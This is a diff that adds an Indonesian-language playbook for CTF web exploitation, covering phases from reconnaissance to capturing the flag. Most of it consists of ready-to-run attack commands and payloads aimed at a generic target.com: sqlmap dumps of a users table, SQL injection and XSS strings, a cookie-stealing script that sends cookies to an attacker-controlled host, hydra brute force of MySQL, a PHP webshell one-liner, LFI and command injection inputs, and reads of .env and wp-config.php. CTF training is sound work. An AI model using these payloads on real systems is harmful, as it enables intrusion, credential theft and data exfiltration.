@@ -1,0 +1,168 @@
+PLAYBOOK CTF WEB EXPLOITATION – TINGKAT KOTA (LENGKAP + PENJELASAN)
+
+Tujuan: Recon → Enumerasi → Exploit → Post Exploitation → Mendapatkan Flag
+
+================================================================================
+PHASE 1: RECONNAISSANCE (Pengumpulan Informasi)
+================================================================================
+
+1. Informasi Teknologi Website
+   whatweb https://target.com
+   Penjelasan: Menampilkan CMS, bahasa pemrograman (PHP, ASP, dll), web server, dan versinya.
+
+2. Cek Header dan File Penting
+   curl -I https://target.com
+   curl https://target.com/robots.txt
+   curl https://target.com/sitemap.xml
+
+3. DNS Enumeration
+   nslookup target.com
+   dig target.com ANY
+   dig target.com MX
+   dig target.com TXT
+   dig target.com +trace
+
+4. Subdomain Enumeration
+   subfinder -d target.com -o subdomains.txt
+
+================================================================================
+PHASE 2: PORT SCANNING & SERVICE ENUMERATION
+================================================================================
+
+nmap -sC -sV -Pn -oN nmap.txt target.com
+nmap -sV -Pn --script vuln target_ip
+
+# MySQL Scan
+nmap --script mysql-info,mysql-empty-password -p 3306 target_ip
+
+================================================================================
+PHASE 3: WEB ENUMERATION
+================================================================================
+
+dirsearch -u https://target.com -e php,asp,aspx,txt,env,bak,old,conf,sql,zip,backup -t 50
+
+ffuf -u https://target.com/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403 -t 80
+
+Cek file sensitif:
+- .env, config.php, wp-config.php, database.php, phpmyadmin/, admin/, .git/HEAD
+
+================================================================================
+PHASE 4: EXPLOITATION
+================================================================================
+
+4.1 SQL INJECTION (Sangat Umum di CTF)
+
+# Basic SQLi Test dengan sqlmap
+sqlmap -u "https://target.com/page.php?id=1" --batch --dbs --risk 3 --level 5
+
+Penjelasan Command:
+- -u          = URL target
+- --batch     = otomatis jawab yes/no
+- --dbs       = tampilkan semua database
+- --risk 3    = level risiko (semakin tinggi semakin agresif)
+- --level 5   = level deteksi (semakin tinggi semakin teliti)
+
+# Lanjutan setelah dapat database
+sqlmap -u "https://target.com/page.php?id=1" --tables -D nama_database
+sqlmap -u "https://target.com/page.php?id=1" --columns -D nama_database -T nama_tabel
+sqlmap -u "https://target.com/page.php?id=1" --dump -D nama_database -T users
+
+# Untuk phpMyAdmin
+sqlmap -u "https://target.com/phpmyadmin/index.php" --forms --dbs --batch
+
+Tips: Kalau sqlmap tidak jalan, coba manual dengan payload:
+' OR 1=1 -- 
+" OR 1=1 -- 
+' UNION SELECT 1,2,3 -- 
+
+================================================================================
+
+4.2 XSS (Cross Site Scripting)
+
+# Cara Manual Testing XSS
+1. Cari form input (search, komentar, nama, pesan, dll)
+2. Masukkan payload berikut satu per satu:
+
+Payload XSS Dasar:
+<script>alert('XSS')</script>
+<img src=x onerror=alert('XSS')>
+"><script>alert('XSS')</script>
+'"><script>alert('XSS')</script>
+
+Payload Reflected XSS:
+https://target.com/search?q=<script>alert('XSS')</script>
+
+Payload Stored XSS (lebih berbahaya):
+Masukkan di kolom komentar atau review.
+
+# XSS dengan Cookie Stealing (Advanced)
+<script>document.location='http://your-ip:8080/steal?cookie='+document.cookie</script>
+
+# Cara Pakai di CTF:
+- Kalau muncul alert box → XSS berhasil
+- Kadang dipakai untuk bypass login atau deface halaman
+- Cek apakah ada filter (bisa pakai payload encoded)
+
+Contoh Payload Lain:
+"><svg/onload=alert(1)>
+jaVasCript:alert('XSS')
+<svg><desc><![CDATA[</desc><script>alert('XSS')</script>]]></svg>
+
+================================================================================
+
+4.3 MySQL Direct Attack (Port 3306 Open)
+
+echo -e "root\nadmin\nmysql\npma\ndbuser" > users.txt
+
+hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt mysql://target_ip -t 16
+hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://target_ip -t 16
+
+Kalau berhasil:
+mysql -h target_ip -u root -p
+
+================================================================================
+PHASE 5: TEKNIK LAIN
+================================================================================
+
+- File Upload → Upload shell.php dengan isi: <?php system($_GET['cmd']); ?>
+- LFI  → ?page=../../../etc/passwd
+- Command Injection → ; whoami   atau  && id
+- IDOR → Ubah angka di URL (id=1 → id=2)
+
+================================================================================
+PHASE 6: POST EXPLOITATION
+================================================================================
+
+Kalau dapat webshell:
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+Cari Flag:
+find / -name flag* 2>/dev/null
+find / -name "*flag*" 2>/dev/null
+cat /var/www/html/.env
+cat wp-config.php
+
+Cek privilege:
+whoami && id && uname -a
+
+================================================================================
+URUTAN KERJA TERBAIK SAAT LOMBA
+================================================================================
+
+1. Recon (Phase 1)
+2. Nmap (Phase 2)
+3. Directory Brute Force (Phase 3)
+4. SQL Injection + XSS Testing
+5. MySQL Brute Force (jika port 3306 open)
+6. Manual Testing (Upload, LFI, Command Injection)
+7. Post Exploitation & Ambil Flag
+
+================================================================================
+TIPS TAMBAHAN
+================================================================================
+
+- Selalu catat hasil command
+- Kalau stuck, ganti teknik
+- Siapkan wordlist sendiri
+- Kerja sistematis dan tenang
+
